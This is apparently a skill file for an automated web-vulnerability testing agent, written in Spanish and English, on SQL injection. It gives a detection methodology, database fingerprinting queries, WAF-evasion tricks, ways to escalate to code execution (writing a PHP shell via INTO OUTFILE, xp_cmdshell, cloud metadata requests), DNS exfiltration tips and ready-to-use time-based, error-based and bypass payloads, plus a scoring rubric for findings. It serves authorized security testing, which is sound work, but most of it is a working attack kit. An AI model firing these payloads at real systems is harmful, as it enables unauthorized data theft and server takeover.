# SKILL: SQL INJECTION (SQLi)

<!-- critical -->
SQL Injection permite a un atacante interferir con las consultas que una aplicación realiza a su base de datos. Puede permitir ver datos que normalmente no se pueden recuperar, modificar o eliminar datos, y en algunos casos, obtener acceso root al servidor (RCE).
<!-- /critical -->

## 1. SCOPE - Dónde Buscar

<!-- scope -->
- **Parámetros de búsqueda**: q=, s=, search=, query=
- **Filtros e IDs**: id=, category=, type=, order=, sort=
- **Headers**: User-Agent, Referer, X-Forwarded-For (si se guardan en DB)
- **Cookies**: Session IDs, tracked preferences
- **Funcionalidades**:
  - Login y registro
  - Visualización de perfiles
  - Búsqueda de productos
  - Dashboards administrativos
  - APIs REST/GraphQL
<!-- /scope -->

## 2. METHODOLOGY

<!-- methodology -->
1. **IDENTIFY**: Probar caracteres especiales (' " ; -- # /*) y observar errores o cambios en respuesta.
2. **HEURISTIC**: Usar payloads de detección (sleep, concatenation) para confirmar vulnerabilidad.
3. **FINGERPRINT**: Determinar el tipo de base de datos (MySQL, PostgreSQL, MSSQL, Oracle).
4. **EXTRACT**: Usar UNION-based, Error-based o Blind para recuperar el nombre de la DB, tablas y columnas.
5. **EXPLOIT**: Recuperar datos sensibles o intentar escalada a OS.
<!-- /methodology -->

## 3. KNOWLEDGE BASE

<!-- knowledge -->

### Database Fingerprinting

- **MySQL/MariaDB**: `SELECT @@version`, `SLEEP(5)`, `BENCHMARK(5000000,MD5(1))`
- **PostgreSQL**: `SELECT version()`, `pg_sleep(5)`, `||` for concat.
- **MSSQL**: `SELECT @@VERSION`, `WAITFOR DELAY '0:0:5'`, `+` for concat.
- **Oracle**: `SELECT banner FROM v$version`, `dbms_pipe.receive_message('a',5)`, `||` for concat.

### Common Bypasses

- **WAF Spaces**: Use `/**/`, `%0D%0A`, `+`, or tabs instead of spaces.
- **String Filters**: Use `HEX()`, `CHAR()`, `CONCAT()` to avoid quotes.
- **Keyword Filters**: `SEL<script>ECT`, `SeLeCt`, `/*!SELECT*/` (MySQL).
- **Comparison**: Use `LIKE`, `BETWEEN`, `IN` instead of `=`.

### Chaining Opportunities

- **SQLi → RCE (MySQL)**: `SELECT ... INTO OUTFILE '/var/www/html/shell.php'`
- **SQLi → RCE (MSSQL)**: `xp_cmdshell 'whoami'`
- **SQLi → SSRF (Oracle)**: `UTL_HTTP.request('http://169.254.169.254/')`

<!-- /knowledge -->

## 4. SCORING GUIDE

<!-- scoring_guide -->

| Score | Criterio | Ejemplo |
| :--- | :--- | :--- |
| **9-10** | **CONFIRMED** - Extracción de datos exitosa | `database_name()` aparece en el HTML o OOB |
| **7-8** | **HIGH** - Error SQL específico visible o timing confirmado | `Syntax error in MySQL...`, delay constante de 5s |
| **5-6** | **MEDIUM** - Cambio en la respuesta (Booleano) | Página cambia contenido con `OR 1=1` vs `OR 1=2` |
| **3-4** | **LOW** - Parámetros con nombres sospechosos | `id=123` sin reacción a caracteres especiales |
| **0-2** | **REJECT** - Falso positivo claro | El error es genérico o se muestra el payload sin procesar |

**AUTO-SCORING KEYWORDS:**

- 9-10: "table_name", "column_name", "user_password", "database()", "version()"
- 7-8: "SQL syntax", "mysql_fetch_array", "PostgreSQL query failed", "ODBC error"
- 5-6: "result different", "boolean difference", "timed out" (si es consistente)
- 0-2: "EXPECTED: SAFE", "sanitized", "display only"

<!-- /scoring_guide -->

## 5. FALSE POSITIVES

<!-- false_positives -->

**RECHAZAR INMEDIATAMENTE:**

1. Error 500 genérico que ocurre con cualquier input.
2. El payload se refleja exactamente en la página sin causar error ni demora.
3. El "delay" detectado es aleatorio y no se repite con el payload.
4. "EXPECTED: SAFE" marcado por el desarrollador.

**NO SON FALSOS POSITIVOS:**

- Errores de sintaxis aunque no veas los datos (Confirma inyección).
- Respuestas en blanco cuando inyectas (Inyección ciega).
- WAF bloqueando el payload (Indica que el parámetro llega al backend).

<!-- /false_positives -->

## 6. PAYLOADS

<!-- payloads -->

### HIGH VALUE (Detection & Fingerprint)

```sql
' OR SLEEP(5)--
" OR SLEEP(5)--
') OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' UNION SELECT @@version,NULL--
```

### MEDIUM VALUE (Error Injection)

```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,DATABASE(),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)--
' AND 1=(SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,0x7e,VERSION(),0x7e,0x7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
```

### BYPASS PAYLOADS

```sql
'/**/OR/**/1=1--
'/**/unIoN/**/sElEcT/**/1,2,3--
%27%20UNION%20SELECT%20CHAR(100,97,116,97,116,97,98,97,115,101,40,41)--
```

<!-- /payloads -->

## 7. PRO TIPS

<!-- pro_tips -->
1. **Check for secondary SQLi**: Tu input puede explotar en otra página (e.g., registro -> perfil).
2. **Automate with care**: Los WAFs detectan `sqlmap` rápidamente. Payloads manuales son mejores.
3. **Out-of-band**: Si Blind falla, prueba DNS exfiltration (`LOAD_FILE`, `UTL_HTTP`).
<!-- /pro_tips -->
